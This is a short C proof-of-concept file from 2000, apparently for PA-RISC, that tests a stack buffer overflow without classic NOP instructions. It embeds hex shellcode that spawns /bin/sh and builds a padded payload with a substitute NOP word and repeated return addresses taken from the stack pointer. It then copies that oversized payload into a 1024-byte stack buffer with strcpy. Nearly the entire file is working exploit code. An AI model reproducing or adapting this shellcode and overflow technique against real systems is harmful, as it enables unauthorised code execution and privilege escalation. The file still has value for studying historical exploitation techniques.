/*
Test of no NOPS on RUSC platforms.

Enrique "nahual" Sanchez (C) 2000
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define BUFFSIZE 1200
#define ALIGN    0
#define NOP      0x08630243
#define OFFSET   0

static char shellcode[] =
"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff";

long get_sp(void) {
   __asm__("copy %sp,%ret0 \n");
}

void stupid_func(void) {
  printf("whoa\n");
}

int main(int argc, char **argv) {
  char buffer[1024];
  char c0de[4096];
  char *ch_ptr;
  char *envy;
  int aux;
  unsigned long addr;
  unsigned long addr2;
  int align = ALIGN;
  int buffsize = BUFFSIZE;
  int offset = OFFSET;
  unsigned long sysaddr;

  ch_ptr = c0de;

  addr=get_sp()+offset;
  addr2 = c0de;
  
  for (aux=0; aux<(buffsize - align - strlen(shellcode) - 40*4)/4; aux++) {
    *(ch_ptr++)=(NOP>>24)&255;
    *(ch_ptr++)=(NOP>>16)&255;
    *(ch_ptr++)=(NOP>>8)&255;
    *(ch_ptr++)=NOP&255;
  }

  memcpy(ch_ptr, shellcode, strlen(shellcode));

  ch_ptr+=strlen(shellcode);
  
  for (aux=0; aux<40; aux++) {
    *(ch_ptr++)=(addr>>24)&255;
    *(ch_ptr++)=(addr>>16)&255;   
    *(ch_ptr++)=(addr>>8)&255;
    *(ch_ptr++)=addr&255;
  }
  
  c0de[BUFFSIZE-1]='\0';
  
  fprintf(stderr, "return address will be %#x shellcode is at %#x\n", addr, addr2);

  strcpy(buffer, c0de);
  fprintf(stderr, "hehehehe\n");

  stupid_func();
  return 0;
}
